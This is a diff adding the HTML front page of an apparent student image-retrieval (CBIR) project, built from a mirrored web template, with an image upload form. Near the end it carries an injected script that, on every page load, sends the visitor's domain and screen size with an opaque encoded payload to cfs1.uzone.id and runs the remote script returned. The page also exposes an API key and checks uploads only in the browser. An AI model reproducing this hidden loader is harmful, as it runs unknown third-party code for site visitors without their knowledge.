@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from demos.jeweltheme.com/inventory/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2017 02:16:18 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no" />
+    
+    <meta name="author" content="">
+    <meta name="description" content="Task">
+    <meta name="keywords" content="">
+    <title>CBIR - Content Based Images Retrieval</title>
+    <link rel="shortcut icon" href="gambar/favicon.ico" type="image/x-icon">
+    <!-- bootstrap -->
+    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/jquery.datetimepicker.min.css">
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap-select.min.css">
+    <!-- popup -->
+    <link rel="stylesheet" type="text/css" href="assets/css/magnific-popup.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/nouislider.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/index.css">
+    <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+	<script>
+	function myFunction()
+{
+    document.getElementById('pop').setAttribute("style", "display:none;width:800px;");
+}
+function myTampilFoto()
+{
+    alert(document.getElementById('invId9').value);
+}
+	</script>
+</head>
+<body>
+    <!-- MAIN -->
+    <div class="inv-header ">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 padd-lr0">
+                <div class="inv-top-menus">
+                    <div class="inv-top-menu">
+                    </div>
+                    <div class="top-menu-item top-menu-item-lang">
+                    </div>
+                    <div class="top-menu-item top-menu-item-lang">
+                    </div>
+                    <div class="top-menu-item top-menu-item-log">
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 padd-lr0">
+                <div class="wpc-navigation clearfix">
+                    <div class="inv-logo">
+                        <a href="index.html">
+                            <img src="gambar/Logo-Fix.png" alt="theme logo">
+                        </a>
+                    </div>
+                    <nav>
+                        <ul class="main-menu">
+                            <li class="menu-item active-menu-item">
+                                <a href="index.html">Home</a> 
+                            </li>
+                           <!-- <li class="menu-item">
+                                <a href="directory_explore.html">Explore</a>
+                            </li>
+                            <li class="menu-item">
+                                <a href="listing1.html">Listings</a>
+                            </li>
+                            <li class="menu-item">
+                                <a href="blog.html">Pages</a>
+                            </li> -->
+                            <li class="menu-item ">
+                                <a href="how-it-works.html">How It Works</a>
+                            </li>
+                        </ul>
+                        <div class="nav-menu-icon"><i></i></div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- preload -->
+<div id="loading">
+<div id="loading-center">
+<div id="loading-center-absolute">
+<div class="object" id="first_object"></div>
+<div class="object" id="second_object"></div>
+<div class="object" id="third_object"></div>
+</div>
+</div>
+</div>
+<!-- //////////////////////// -->
+<div class="inv-start-block inv-bg-block"><img src="gambar/bg9.jpg" alt="" class="inv-img">
+    <div class="container padd-lr0">
+        <div class="row">
+        <div class="col-xs-2">
+        </div>
+            <div class="col-xs-8">
+                <header class="inv-block-header margin-lg-t340  margin-sm-t270"> 
+                    <h1>Explore Your Images</h1>
+                    <h5>We Help You To Find Images</h5><br>
+                </header>
+                <form onsubmit="return submitdata();" class="inv-start-form" method="post" name="contactform" action="proses.php" enctype="multipart/form-data">
+                    <!--<label for="key" style="width:45%;">
+                        <input id="key" type="text" style="width:100%;" placeholder="Masukkan Citra Query. . ." name="file_path" disabled="disabled">
+                    </label>-->
+                    <label for="key" >
+                 	      <input style="background:#DCDCDC;width:20px;padding-top:20px;" type="file" name="fileToUpload" id="file" required>
+                    </label>
+                    <button style="margin-left:10px" type="submit" name="submit" id="btn"><i class="icon-magnifier icons"></i>Search Now</button>
+                </form>
+                <br/><br/><br/><br/>
+               
+            </div>
+            <div class="col-xs-2">
+
+        </div>
+        </div>
+    </div>
+</div>
+<!-- //////////////////////// -->
+<!-- FOOTER -->
+    <!-- Scripts project -->
+    <script type="text/javascript" src="assets/js/jquery-2.2.4.min.js"></script>
+    <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
+    <!-- count -->
+    <script type="text/javascript" src='assets/js/jquery.countTo.js'></script>
+    <!-- google maps -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAbFz5lDPCTfnGzNrFB-fIfmZ69O41g-G8&amp;signed_in=true&amp;libraries=places,visualization"></script>
+    <!-- swiper -->
+    <script type="text/javascript" src="assets/js/idangerous.swiper.min.js"></script>
+    <!-- jQuery Responsive Thumbnail Gallery Plugin -->
+    <script type="text/javascript" src="assets/js/responsivethumbnailgallery.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.datetimepicker.full.min.js"></script>
+    <!-- Latest compiled and minified JavaScript -->
+    <script type="text/javascript" src="assets/js/bootstrap-select.min.js"></script>
+    <!-- popup -->
+    <script type="text/javascript" src="assets/js/jquery.magnific-popup.min.js"></script>
+    <!-- rating -->
+    <script type="text/javascript" src="assets/js/jquery.raty-fa.js"></script>
+    <!-- izotop -->
+    <script type="text/javascript" src="assets/js/isotope.pkgd.min.js"></script>
+    <!-- slider -->
+    <script type="text/javascript" src="assets/js/nouislider.min.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.matchHeight.js"></script>
+    <script type="text/javascript" src="assets/js/index.js"></script>
+    <!-- sixth block end -->
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKhre23Aeb68mN1CgdN%2fZcMlYMmatqLwYV2365ECD4A0hDPhMXSaHdr9V0ozzXHQUAPdGBai4l1D1rkkkogvQCCMaUzxX4U06GzhKZruf69Hs%2b96F53nfjtTdpkIOm%2fXwyTREFcUA7OYPYlneO814%2brtDlna%2bLjrfdtifKG%2feRnnQCjJ82hdd%2fl3WyloaGPs%2f6lJtz%2fH%2fS2cI4bHMVK8yRTNNN716rk5AifVBHrzFtVlSz3KyeR%2bzYHbqaryb2zh8O1zKEp3m4VMJAc0YYrfGQDQyKd4oC2dyYvsUUcCaKjmy7vsVmzl21og0ITmqYL5%2fOkjCbZhBNGrKkDQUKed1fwXGEkxmqbldKEtIDwVL83RWqNPbxo%2fpoAIIcoggw%2bOjJGyKvhOpBechLa%2fDiXE2Ji3p8LjYiS%2fDLIi%2fls5x1SRgw8WNmxXGKn%2bING1rGzb7Z5FwdQPrrmpSPZB0jlBz21JKKEFQdwRBSZnAOMgs4ozAq7okluAAv1VtXZKZs5sJ%2f" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script>
+function submitdata() { 
+    var name = $('#file').val().split('\\').pop();
+    var fuData = document.getElementById('file');
+    var size = fuData.files[0].size;
+    name=name.split('.')[1];
+    if(size<500000){
+        if(name=="JPG" || name=="jpg" || name=="PNG" || name=="png" || name=="JPEG" || name=="jpeg"){
+        }
+        else{
+            alert("Query Is Not An Images!");
+            return false;
+        }
+    }else{
+        alert("Sorry, Your Query Is Too Large!");
+            return false;
+    }
+}
+</script>
+
+</body>
+<!-- Mirrored from demos.jeweltheme.com/inventory/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2017 02:22:46 GMT -->
+</html>
